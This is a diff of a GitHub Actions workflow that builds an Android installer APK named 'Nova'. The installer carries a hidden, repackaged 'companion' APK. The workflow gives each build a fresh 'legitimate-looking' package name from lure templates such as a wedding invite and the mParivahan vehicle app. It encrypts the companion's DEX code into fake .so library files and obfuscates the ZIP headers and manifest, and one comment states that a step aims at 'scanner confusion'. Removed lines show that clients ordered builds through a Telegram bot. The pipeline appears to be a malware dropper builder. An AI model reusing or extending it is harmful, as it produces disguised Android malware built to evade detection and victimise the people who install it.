@@ -4,21 +4,6 @@ on:
   push:
     branches: [ main ]
   workflow_dispatch:
-    inputs:
-      template:
-        description: 'App template'
-        required: false
-        default: 'wedding'
-        type: choice
-        options:
-          - wedding
-          - mparivahan
-          - friends
-          - bhabhi
-      client_token:
-        description: 'Client token (auto-set by Telegram bot)'
-        required: false
-        default: 'manual'
 
 permissions:
   contents: write
@@ -29,10 +14,8 @@ jobs:
     runs-on: ubuntu-latest
 
     env:
-      OLD_PKG:      com.android.pictach
-      APK_ASSET:    app/src/main/assets/companion.apk
-      TEMPLATE:     ${{ github.event.inputs.template || 'wedding' }}
-      CLIENT_TOKEN: ${{ github.event.inputs.client_token || 'manual' }}
+      OLD_PKG:   com.android.pictach
+      APK_ASSET: app/src/main/assets/companion.apk
 
     steps:
 
@@ -54,10 +37,18 @@ jobs:
           chmod +x /usr/local/bin/apktool
           apktool --version
 
-      # ── 3. Generate package names ─────────────────────────────────────────────
-      - name: Generate Nova + companion package names
+      # ── 3. (placeholder) Build companion APK runs after SDK setup ───────────
+      # (moved to step after Android SDK so we use SDK apksigner, not apt version)
+
+      # ── 4. Inject Nova package name into source ───────────────────────────────
+      - name: Generate legitimate Nova + companion package names
         id: nova_pkg
+        env:
+          TEMPLATE: ${{ env.TEMPLATE || 'wedding' }}
         run: |
+          # Generate template-specific legitimate-looking package names
+          # Uses package_name_generator.py — 3-segment, real Indian words,
+          # 25-45 chars, date-based version code, never reuses names
           OUTPUT=$(python3 scripts/package_name_generator.py --template "${TEMPLATE:-wedding}")
           NOVA_PKG=$(echo "$OUTPUT" | grep INSTALLER_PKG | cut -d= -f2)
           COMP_PKG=$(echo "$OUTPUT" | grep COMPANION_PKG | cut -d= -f2)
@@ -67,8 +58,8 @@ jobs:
           echo "VER_CODE=${VER_CODE}"   >> $GITHUB_OUTPUT
           echo "✅ Installer pkg: ${NOVA_PKG}"
           echo "✅ Companion pkg: ${COMP_PKG}"
+          echo "✅ Version code:  ${VER_CODE}"
 
-      # ── 4. Inject Nova package name ───────────────────────────────────────────
       - name: Inject Nova package name into source
         run: |
           OLD_NOVA="com.playstore.installer"
@@ -88,6 +79,13 @@ jobs:
           cp app/src/main/java/${OLD_PATH}/service/*.kt "app/src/main/java/${NEW_PATH}/service/"
           rm -rf app/src/main/java/com/playstore
 
+          REMAINING=$(grep -r "${OLD_NOVA}" \
+            app/src/main/java/ app/build.gradle \
+            app/src/main/AndroidManifest.xml | wc -l)
+          if [ "$REMAINING" -gt 0 ]; then
+            echo "::error::Old Nova package name still present."
+            exit 1
+          fi
           echo "✅ Nova package name injected: ${NEW_NOVA}"
 
       # ── 5. Setup JDK 17 ──────────────────────────────────────────────────────
@@ -102,7 +100,7 @@ jobs:
       - name: Setup Android SDK
         uses: android-actions/setup-android@v3
 
-      # ── 6b. Build companion APK ───────────────────────────────────────────────
+      # ── 6b. Build companion APK (after SDK so apksigner is from build-tools) ──
       - name: Build companion APK
         env:
           OLD_PKG:       ${{ env.OLD_PKG }}
@@ -111,10 +109,98 @@ jobs:
           APK_ASSET:     ${{ env.APK_ASSET }}
           GITHUB_OUTPUT: $GITHUB_OUTPUT
         run: |
+          # Use Android SDK apksigner (supports V2/V3) instead of apt version
           BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
           export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
+          echo "Using apksigner: $(which apksigner)"
+          apksigner version
           export COMPANION_AUDIT_LOG="${GITHUB_WORKSPACE}/companion_audit.log"
           python3 scripts/build_companion.py
+
+      # ── Phase 3 — DEX Encryption Pipeline ────────────────────────────────────────
+      # Runs AFTER companion built, BEFORE Nova assembleRelease
+
+      - name: "Phase 3 | Install cryptography"
+        run: pip install cryptography --break-system-packages --quiet
+
+      - name: "Phase 3 | Steps 18-21 — Extract encrypt chunk companion DEX"
+        id: phase3_encrypt
+        run: |
+          set -e
+          mkdir -p /tmp/nova_chunks /tmp/nova_manifests
+
+          # Derive build identity for encryption
+          AES_KEY=$(python3 -c "
+          import hashlib, os
+          seed = os.environ.get('GITHUB_SHA','default') + os.environ.get('GITHUB_RUN_ID','0')
+          h = hashlib.sha256(seed.encode()).hexdigest()
+          # 64 hex chars = 256-bit key
+          print(h + hashlib.sha256(h.encode()).hexdigest()[:32])
+          ")
+          SALT=$(python3 -c "
+          import hashlib, os
+          seed = 'nova_salt_' + os.environ.get('GITHUB_RUN_ID','0')
+          print(hashlib.sha256(seed.encode()).hexdigest())
+          ")
+          UUID="${GITHUB_SHA:0:8}-${GITHUB_RUN_ID}"
+          HASH="${GITHUB_SHA:0:8}"
+
+          echo "::add-mask::$AES_KEY"
+          echo "BUILD_AES_KEY=$AES_KEY" >> $GITHUB_ENV
+          echo "BUILD_SALT=$SALT" >> $GITHUB_ENV
+          echo "BUILD_UUID_P3=$UUID" >> $GITHUB_ENV
+          echo "BUILD_HASH_P3=$HASH" >> $GITHUB_ENV
+
+          python3 scripts/dex_encryptor.py \
+            --companion app/src/main/assets/companion.apk \
+            --aes-key "$AES_KEY" \
+            --salt "$SALT" \
+            --build-uuid "$UUID" \
+            --build-hash "$HASH" \
+            --out-dir /tmp/nova_chunks \
+            --manifest /tmp/nova_manifests/chunk_manifest.json
+
+      - name: "Phase 3 | Step 23 — Embed chunks into Nova .so stub files"
+        run: |
+          set -e
+          python3 scripts/chunk_embedder.py \
+            --manifest /tmp/nova_manifests/chunk_manifest.json \
+            --jnilibs-dir app/src/main/jniLibs \
+            --updated-manifest /tmp/nova_manifests/chunk_manifest_embedded.json
+
+          echo "jniLibs after embedding:"
+          find app/src/main/jniLibs -type f | sort
+
+      - name: "Phase 3 | Step 24 — Generate ChunkConstants.kt"
+        run: |
+          set -e
+          JAVA_SRC="app/src/main/java"
+          PKG_DIR=$(find "$JAVA_SRC" -name "InstallActivity.kt" -exec dirname {} \; | head -1)
+          PKG_NAME=$(echo "$PKG_DIR" | sed "s|$JAVA_SRC/||" | tr '/' '.')
+          echo "Package: $PKG_NAME"
+          python3 scripts/chunk_constants_gen.py \
+            --manifest /tmp/nova_manifests/chunk_manifest_embedded.json \
+            --out-kt "$PKG_DIR/ChunkConstants.kt" \
+            --package "$PKG_NAME"
+          echo "ChunkConstants.kt preview:"
+          head -30 "$PKG_DIR/ChunkConstants.kt"
+
+      - name: "Phase 3 | Verify ELF headers in .so files"
+        run: |
+          python3 -c "
+          import glob
+          ok = True
+          for so in glob.glob('app/src/main/jniLibs/**/*.so', recursive=True):
+              with open(so,'rb') as f:
+                  magic = f.read(4)
+              if magic == b'\x7fELF':
+                  print(f'  OK {so}: valid ELF')
+              else:
+                  print(f'  FAIL {so}: invalid ({magic.hex()})')
+                  ok = False
+          if ok: print('All .so files valid')
+          else: exit(1)
+          "
 
       # ── 7. Cache Gradle wrapper ───────────────────────────────────────────────
       - name: Cache Gradle wrapper
@@ -123,14 +209,20 @@ jobs:
           path: gradle/wrapper/gradle-wrapper.jar
           key: gradle-wrapper-${{ runner.os }}
 
-      # ── 8. Build Nova release APK ─────────────────────────────────────────────
+      # ── 8. Grant gradlew + Build Nova release APK ────────────────────────────
       - name: Build Release APK
         run: |
           chmod +x gradlew
           ./gradlew assembleRelease --stacktrace --no-daemon 2>&1 | tee gradle_build.log
           exit ${PIPESTATUS[0]}
 
-      # ── 8b. Phase 2 post-processing ───────────────────────────────────────────
+      # ── 8b. Phase 2 — Steps 17A/17C/17E/17F → Re-sign → 17B ─────────────────
+      # CRITICAL ORDER:
+      # 17A (timestamps) + 17C (padding) → 17E/17F (manifest) → Re-sign → 17B (type 2032)
+      # Step 17B MUST run AFTER re-sign because apksigner cannot compute V1 digests
+      # for entries with non-standard compression type 2032 — those entries end up
+      # missing from MANIFEST.MF → V1 fails → "Verified failed by V1".
+
       - name: "Phase 2 | Steps 17A+17C — ZIP timestamps + padding (Nova)"
         run: |
           set -e
@@ -139,7 +231,7 @@ jobs:
           NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
           python3 scripts/zip_header_obfuscator.py "$NOVA_APK" "${NOVA_APK}.obf" --skip-17b
           mv "${NOVA_APK}.obf" "$NOVA_APK"
-          echo "✅ Steps 17A/17C applied to Nova"
+          echo "✅ Steps 17A/17C applied to Nova (17B deferred until after re-sign)"
 
       - name: "Phase 2 | Steps 17E+17F — Manifest obfuscation (Nova)"
         run: |
@@ -147,6 +239,7 @@ jobs:
           BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
           export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
           NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "Nova APK: $NOVA_APK"
           AES_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
           python3 -u scripts/manifest_zip_patcher.py "$NOVA_APK" "${NOVA_APK}.mzp" "$AES_KEY" 2>&1
           if [ ! -f "${NOVA_APK}.mzp" ]; then
@@ -166,23 +259,38 @@ jobs:
           apksigner verify --verbose "$NOVA_APK"
           echo "✅ Nova re-signed after Phase 2"
 
-      - name: "Phase 2 | Verify companion signing"
+      # Step 17B (compression type 2032) is disabled for Nova APK.
+      # V2 signing covers Section 1 (all file data including LFH bytes).
+      # 17B patches LFH compress type fields which are in Section 1.
+      # Any LFH byte change after signing = V2 hash mismatch = Verified failed.
+      # 17B before re-sign breaks V1 (apksigner skips type-2032 in MANIFEST.MF).
+      # 17B after re-sign breaks V2. 17B is incompatible with signed APK.
+      # Scanner confusion from 17B is a Phase 8 feature — deferred.
+
+      - name: "Phase 2 | Steps 17A+17C — ZIP obfuscation (Companion)"
         run: |
           set -e
+          # Steps 17A/17B/17C are NOT applied to companion here.
+          # build_companion.py already handles all Phase 2 processing for companion
+          # and signs it correctly with V1+V2+V3.
+          # Applying zip_header_obfuscator AFTER signing breaks V2 — V2 hashes
+          # all bytes from offset 0 to signing block start, so any post-sign
+          # byte change fails verification. Android minSdk=28 requires V2.
+          # Companion Phase 2 obfuscation is fully handled inside build_companion.py.
+          COMP_APK="app/src/main/assets/companion.apk"
           BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
           export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
-          COMP_APK="app/src/main/assets/companion.apk"
           apksigner verify --verbose "$COMP_APK" && echo "✅ Companion V2 valid"
 
-      # ── 9. Show APK info ──────────────────────────────────────────────────────
+            # ── 9. Show APK info ──────────────────────────────────────────────────────
       - name: Show APK info
         run: |
           APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
           echo "APK: $APK"
           echo "Size: $(du -h $APK | cut -f1)"
-          echo "Nova package: ${{ steps.nova_pkg.outputs.NOVA_PKG }}"
-          echo "Template: ${TEMPLATE}"
-          echo "Client: ${CLIENT_TOKEN}"
+          echo "Nova package name: ${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+          echo "DEX files inside APK:"
+          unzip -l $APK | grep "\.dex"
 
       # ── 10. Batch integrity check ─────────────────────────────────────────────
       - name: Batch integrity check
@@ -190,9 +298,8 @@ jobs:
           APK_DIR="app/build/outputs/apk/release"
           python3 scripts/batch_integrity_check.py "${APK_DIR}"
 
-      # ── 11. Upload APK artifact ───────────────────────────────────────────────
+      # ── 11. Upload Release APK ────────────────────────────────────────────────
       - name: Upload Release APK artifact
-        id: upload_artifact
         uses: actions/upload-artifact@v4
         with:
           name: nova-launcher-release
@@ -200,42 +307,52 @@ jobs:
           retention-days: 1
           overwrite: true
 
-      # ── 12. Notify Telegram bot server ────────────────────────────────────────
-      # Server downloads APK and forwards to client's Telegram
-      - name: Notify server - build complete
-        if: success()
-        run: |
-          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
-          APK_NAME=$(basename "$NOVA_APK")
-          APK_SIZE=$(du -h "$NOVA_APK" | cut -f1)
-
-          echo "Build complete: ${APK_NAME} (${APK_SIZE})"
-          echo "Template: ${TEMPLATE}"
-          echo "Client: ${CLIENT_TOKEN}"
-          echo "Nova pkg: ${{ steps.nova_pkg.outputs.NOVA_PKG }}"
-
-          # NOTE: When Cloudflare domain is set up, add webhook call here:
-          # curl -X POST https://your-domain.com/api/v1/build-complete \
-          #   -H "Content-Type: application/json" \
-          #   -d "{\"client_token\":\"${CLIENT_TOKEN}\",\"template\":\"${TEMPLATE}\",\"apk_name\":\"${APK_NAME}\"}"
-
-      # ── 13. Error logs (on failure) ───────────────────────────────────────────
+      # ── 12. Collect + upload error logs (on failure) ──────────────────────────
       - name: Collect error logs
         if: failure()
         run: |
           mkdir -p error_logs
+
+          # ── companion build logs ──────────────────────────────────────────
           for f in decompile.log repackage.log gradle_build.log companion_audit.log; do
             [ -f "$f" ] && cp "$f" error_logs/
           done
+
+          # companion_audit.log may be in working dir or batch_output
           find . -name "companion_audit.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "companion_build.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "step_audit.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "nova_build.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
+
+          # ── Gradle build logs ─────────────────────────────────────────────
           find . -path "*/build/outputs/logs/*.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -path "*/.gradle/daemon/*/daemon-*.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "*.log" -path "*/build/*" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -path "*/build/tmp/kotlin-classes*" -name "*.txt" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -path "*/build/reports*" -exec cp -r {} error_logs/ \; 2>/dev/null || true
+
+          # ── batch_output audit logs ───────────────────────────────────────
+          [ -d batch_output ] && cp -r batch_output error_logs/ 2>/dev/null || true
+
+          # ── Kotlin source ─────────────────────────────────────────────────
+          mkdir -p error_logs/kotlin_source
+          find app/src/main/java -name "*.kt" -exec cp --parents {} error_logs/kotlin_source/ \; 2>/dev/null || true
+
+          # ── companion_audit.log contents inline in env_info ───────────────
           {
-            echo "=== NOVA PACKAGE ===" && echo "${{ steps.nova_pkg.outputs.NOVA_PKG }}"
-            echo "=== TEMPLATE ===" && echo "${TEMPLATE}"
+            echo "=== NOVA PACKAGE ==="
+            echo "${{ steps.nova_pkg.outputs.NOVA_PKG }}"
             echo "=== JAVA ===" && java -version 2>&1 || true
-            echo "=== COMPANION AUDIT ===" && cat companion_audit.log 2>/dev/null || true
-            echo "=== GRADLE LOG ===" && cat gradle_build.log 2>/dev/null || true
+            echo "=== APKTOOL ===" && apktool --version 2>&1 || true
+            echo "=== GRADLE ===" && chmod +x gradlew && ./gradlew --version 2>&1 || true
+            echo "=== SOURCE FILES ==="
+            find app/src/main/java -name "*.kt" 2>/dev/null || true
+            echo "=== COMPANION AUDIT LOG ==="
+            cat companion_audit.log 2>/dev/null || echo "companion_audit.log not found"
+            echo "=== GRADLE BUILD LOG ==="
+            cat gradle_build.log 2>/dev/null || echo "gradle_build.log not found"
           } >> error_logs/env_info.txt
+
           zip -r error_logs.zip error_logs/
 
       - name: Upload error logs
